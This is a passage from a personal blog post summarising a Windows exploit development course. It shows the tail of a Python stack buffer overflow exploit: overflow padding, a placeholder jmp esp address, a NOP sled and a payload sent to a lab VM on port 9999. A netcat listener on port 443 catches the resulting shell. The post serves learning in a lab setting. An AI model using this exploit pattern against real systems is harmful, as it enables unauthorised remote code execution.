crash <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2003</span>
<span style="color:#75715e"># Knowing where jmp esp is in memory from the vulnerable module esssfunc.dll, push this address into the already known EIP.</span>
<span style="color:#75715e"># This will make EIP point to this memory address to execute, which will jump to ESP</span>
<span style="color:#75715e"># which at the moment (but not for long) is filled with &#39;C&#39;.</span>
time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Setting known jmp esp memory address&#34;</span>)
crash <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,[MEMORY ADDRESS])
<span style="color:#75715e"># &#39;&lt;L&#39; will convert the address to little-endian format for the CPU to process.</span>
<span style="color:#75715e"># Fill the rest with NOP sled (629 needed)</span>
time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Preparing the NOP sled&#34;</span>)
crash <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">629</span>
<span style="color:#75715e"># Add the payload to crash</span>
crash <span style="color:#f92672">+=</span> payload
<span style="color:#75715e"># Send data remotely to Win 7 VM via port 9999</span>
time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.8</span>)
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Sending exploit...&#34;</span>)
s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;[IP Address]&#34;</span>, <span style="color:#ae81ff">9999</span>))
time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">2</span>)
s<span style="color:#f92672">.</span>send(command <span style="color:#f92672">+</span> crash)
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[!] ++++ Exploit complete! Enjoy your shell! ++++&#34;</span>)
<span style="color:#75715e">#Built in netcat listener started</span>
os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;nc -nlvp 443&#34;</span>)
s<span style="color:#f92672">.</span>close()
</code></pre></div><h2 id="andwere-in">And&hellip;We&rsquo;re In.</h2>
<p>Let&rsquo;s run our built exploit and start a netcat listener to catch the shell (in the above this is started automatically). Now Take a look at the results of our final exploit.</p>
<p><span style="display:block;text-align:center;size=100%;"><img src="/files/Windows-Exploit-Development-Course/exploit.gif" alt="GIF of working exploit"></span></p>
<p>Welp. We developed an exploit.</p>
<h2 id="conclusion">Conclusion</h2>
<p>This post is a highly summarized version of what I did in the Intro to Windows Exploit Development course. There is a plethora of items and ideas in this post that I did not explain intentionally. Again, this is course was an introduction and if you want to learn the details of exploit development or more about this post I implore you; go through the course. You&rsquo;ll learn a ton and have even more fun. This is the first step from moving out of Mom&rsquo;s basement as a skiddie into the beginner steps of becoming a professional. Possibly as an Exploit Developer.</p>
<h2 id="epilogue">Epilogue</h2>
<p>Fantastic thanks to Connor McGarr for creating the Intro to Windows Exploit Development course. Everything in this post was from his course exclusively and I&rsquo;m so glad to have taken it.
You can find his resources and him below:</p>
<ul>
<li><a href="https://github.com/connormcgarr/An-Intro-2-Win-ED">Intro to Windows Exploit Development Course</a></li>
<li><a href="https://connormcgarr.github.io/">Connor&rsquo;s Github</a></li>
<li><a href="https://connormcgarr.github.io/Exception-Handlers-and-Egg-Hunters/">Exploit Development: Exception Handlers and Egg Hunters</a> (Suggested step after this course)</li>
</ul>

  </div>
  <footer>
    <ul class="stats">
  
    
    
      <li class="categories">
        <ul>
          
            
            <li><a class="article-category-link" href="https://novabutter.github.io/categories/exploit-development">Exploit Development</a></li>
          
        </ul>
      </li>
    
  
  
    
    
      <li class="tags">
        <ul>
          
            
            <li><a class="article-category-link" href="https://novabutter.github.io/tags/exploit-development">Exploit Development</a></li>
          
            
            <li><a class="article-category-link" href="https://novabutter.github.io/tags/course">Course</a></li>
          
            
            <li><a class="article-category-link" href="https://novabutter.github.io/tags/windows-7">Windows 7</a></li>
          
        </ul>
      </li>
    
  
</ul>

  </footer>
</article>


<div class="pagination">
  
    <a href="/blog/2020-6-22-learning-sprint-june-22-june-28/" class="button"><div class="previous"><div>Learning Sprint: June 22-June-28</div></div></a>
  
  
</div>


      </main>
      <section id="site-sidebar">
  
    <section id="recent-posts">
      <header>
        <h1>Recent posts</h1>
      </header>
      
      <article class="mini-post">
        <section>
          
  <a href="/blog/2020-6-22-windows-exploit-development-vanilla-buffer-overflow/" class="image featured">
    
      <img src="/files/cover-pics/itwed.jpg" alt="">
    
  </a>


        </section>
        <header>
          <h1><a href="/blog/2020-6-22-windows-exploit-development-vanilla-buffer-overflow/">Windows Exploit Development: Vanilla Buffer Overflow</a></h1>
          <time class="published" datetime="">June 26, 2020</time>
        </header>
      </article>
      
      <article class="mini-post">
        <section>
          
  <a href="/blog/2020-6-22-learning-sprint-june-22-june-28/" class="image featured">
    
      <img src="/files/cover-pics/622Sprint.png" alt="">
    
  </a>


        </section>
        <header>
          <h1><a href="/blog/2020-6-22-learning-sprint-june-22-june-28/">Learning Sprint: June 22-June-28</a></h1>
          <time class="published" datetime="">June 22, 2020</time>
        </header>
      </article>
      
      <article class="mini-post">
        <section>
          
  <a href="/blog/2020-6-21-learning-sprint-review/" class="image featured">
    
      <img src="/files/cover-pics/621Review.jpg" alt="">
    
  </a>


        </section>
        <header>
          <h1><a href="/blog/2020-6-21-learning-sprint-review/">Sprint Review: June 15 - June 20</a></h1>
          <time class="published" datetime="">June 21, 2020</time>
        </header>
      </article>
      
      <article class="mini-post">
        <section>
          
  <a href="/blog/2020-6-15-learning-sprint-june-15-june-20/" class="image featured">
    
      <img src="/files/cover-pics/615Sprint.png" alt="">
    
  </a>


        </section>
        <header>
          <h1><a href="/blog/2020-6-15-learning-sprint-june-15-june-20/">Learning Sprint: June 15 - June 20</a></h1>
          <time class="published" datetime="">June 15, 2020</time>
        </header>
      </article>
      
      
        <footer>
          <a href="/blog/" class="button">See more</a>
        </footer>
      
    </section>
  

  
    
      <section id="categories">
        <header>
          <h1><a href="/categories">Categories</a></h1>
        </header>
        <ul>
          
            
          
          
          <li>
            
              <a href="/categories/exploit-development/">exploit-development<span class="count">1</span></a>
            
          
          <li>
            
              <a href="/categories/learning-sprint/">learning-sprint<span class="count">25</span></a>
            
          
          <li>
            
              <a href="/categories/miscellaneous/">miscellaneous<span class="count">1</span></a>
            
          
          <li>
            
              <a href="/categories/programming/">programming<span class="count">1</span></a>
            
          
          </li>
        </ul>
      </section>
    
  

  
    <section id="mini-bio">
      <header>
        <h1>About</h1>
      </header>
      <p>In short, I am an ever-learning, curious, motivated, and passiontate individual in all topics technology. I get my joy from cracking smiles in any way I can and helping those who are less fortunate than myself, generally with my gift of knowledge in the technological field. I'm pessimistic, doubtful of myself, and I feel I deserve absolutely nothing in life; everything is earned. I'll make it to a point of success on my deathbed, but until then I'll be moving and improving the world and people around me.</p>
      <footer>
        <a href="/about" class="button">Learn More</a>
      </footer>
    </section>
  
</section>

      <footer id="site-footer">
  
      <ul class="socnet-icons">
        

        <li><a href="//github.com/Novabutter" target="_blank" rel="noopener" title="GitHub" class="fab fa-github"></a></li>











<li><a href="//linkedin.com/in/glicameli" target="_blank" rel="noopener" title="LinkedIn" class="fab fa-linkedin"></a></li>




























      </ul>
  
  <p class="copyright">
    
      &copy; 2020
      
        Giovanni Licameli
      
    . <br>
    Theme: <a href='https://github.com/pacollins/hugo-future-imperfect-slim' target='_blank' rel='noopener'>Hugo Future Imperfect Slim</a><br>A <a href='https://html5up.net/future-imperfect' target='_blank' rel='noopener'>HTML5 UP port</a> | Powered by <a href='https://gohugo.io/' title='0.68.3' target='_blank' rel='noopener'>Hugo</a>
  </p>
</footer>
<a id="back-to-top" href="#" class="fas fa-arrow-up fa-2x"></a>

      <script src="/js/highlight.pack.js"></script>
    <script>hljs.initHighlightingOnLoad();</script><script src="/js/bundle.min.e0c399b948d3cf5c3a5e3badb94023d0b064a19ac39fd8cd79fb9f57fa4d1091.js" integrity="sha256-4MOZuUjTz1w6XjutuUAj0LBkoZrDn9jNefufV/pNEJE="></script>
    <script src="/js/add-on.js"></script>
    </div>
  </body>
</html>
